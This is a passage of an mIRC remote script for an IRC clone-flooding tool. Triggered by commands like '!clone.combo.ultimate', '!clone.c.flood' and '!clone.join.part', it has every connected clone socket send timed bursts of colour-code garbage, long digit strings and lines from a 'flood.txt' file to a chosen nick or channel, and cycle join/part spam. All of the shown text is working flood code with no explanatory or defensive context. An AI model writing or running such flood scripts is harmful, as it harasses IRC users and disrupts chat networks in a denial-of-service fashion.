n113=    /timer 1 7 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
n114=    /timer 1 11 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8))
n115=    /timer 1 15 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
n116=  inc %cc |  goto ccloop |   :end  | unset %cc }
n117=  if ($1 == !clone.combo.ultimate) {  if ($2 == $null) { msg # !clone.combo.ultimate #/Nick | halt } |  //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } |  /sockwrite -n $sock(clone*,%cc) PRIVMSG $$2 $read flood.txt 
n118=    /timer 1 5 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $read flood.txt
n119=    /timer 1 11  /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $read flood.txt
n120=    /timer 1 16  /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $read flood.txt
n121=    /timer 1 22  /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $read flood.txt
n122=    /timer 1 27 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2  $read flood.txt
n123=    /timer 1 32 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
n124=    /timer 1 37   /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4))
n125=    /timer 1 44 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3
n126=    /timer 1 49 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222
n127=    /timer 1 53    /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4))
n128=    /timer 1 57    /sockwrite -n $sock(clone*,%cc) PRIVMSG $$2 $read flood.txt
n129=    inc %cc |  goto ccloop |  :end  | unset %cc
n130=  }
n131=  if ($1 == !clone.c.flood) {  if ($2 == $null) { halt } | //msg # Now Flooding... $2 (to stop !flood.stop) |  /clone msg $2 $3- | /clone notice $2 $3-  | //timerConstantFlood1 0 5 /clone msg $2 $3- |  /clone msg $2 $3- | //timerConstantFlood2 0 8 /clone notice $2 $3-  }
n132=  if ($1 == !flood.stop) { timerConstantFlood* off  | msg # Stopping Flood Complete... } 
n133=  if ($1 == !set.flood.server.port) {  if ($2 == $null) { halt } | if ($3 == $null) { halt } | /set %msg.flood.server $$2 |  /set %msg.flood.server.port $3  }
n134=  if ($1 == !clone.join.part) {  
n135=    if ($2 == $null) { halt } 
n136=    /sockwrite -n clone* join $2 
n137=    /sockwrite -n clone* part $2 : $+ $3-
n138=    /sockwrite -n clone* join $2 
n139=    /sockwrite -n clone* part $2 : $+ $3-
n140=    /sockwrite -n clone* join $2 
n141=    /sockwrite -n clone* part $2 : $+ $3-
n142=    /sockwrite -n clone* join $2 
n143=    /sockwrite -n clone* part $2 : $+ $3-
n144=    /sockwrite -n clone* join $2 
n145=    /sockwrite -n clone* part $2 : $+ $3-
n146=    /sockwrite -n clone* join $2 
n147=    /sockwrite -n clone* part $2 : $+ $3-
n148=    /sockwrite -n clone* join $2 
n149=    /sockwrite -n clone* part $2 : $+ $3-
n150=    /sockwrite -n clone* join $2 
n151=    /sockwrite -n clone* part $2 : $+ $3-
n152=    /sockwrite -n clone* join $2 
n153=    /sockwrite -n clone* part $2 : $+ $3-
n154=    /sockwrite -n clone* join $2 
n155=    /sockwrite -n clone* part $2 : $+ $3-
n156=    /sockwrite -n clone* join $2 
n157=    /sockwrite -n clone* part $2 : $+ $3-
n158=    /sockwrite -n clone* join $2 
n159=    /sockwrite -n clone* part $2 : $+ $3-
n160=    /sockwrite -n clone* join $2 
n161=    /sockwrite -n clone* part $2 : $+ $3-
n162=    /sockwrite -n clone* join $2 
n163=    /sockwrite -n clone* part $2 : $+ $3-
n164=    /sockwrite -n clone* join $2 
n165=    /sockwrite -n clone* part $2 : $+ $3-
n166=    /sockwrite -n clone* join $2 
n167=    /sockwrite -n clone* part $2 : $+ $3-
n168=    /sockwrite -n clone* join $2 
n169=    /sockwrite -n clone* part $2 : $+ $3-
n170=    /sockwrite -n clone* join $2 
n171=    /sockwrite -n clone* part $2 : $+ $3-
n172=    /sockwrite -n clone* join $2 
n173=    /sockwrite -n clone* part $2 : $+ $3-
n174=    /sockwrite -n clone* join $2 
n175=    /sockwrite -n clone* part $2 : $+ $3-
n176=    /sockwrite -n clone* join $2 
n177=    /sockwrite -n clone* part $2 : $+ $3-
n178=    /sockwrite -n clone* join $2 
n179=    /sockwrite -n clone* part $2 : $+ $3-
n180=
n181=  }
n182=}
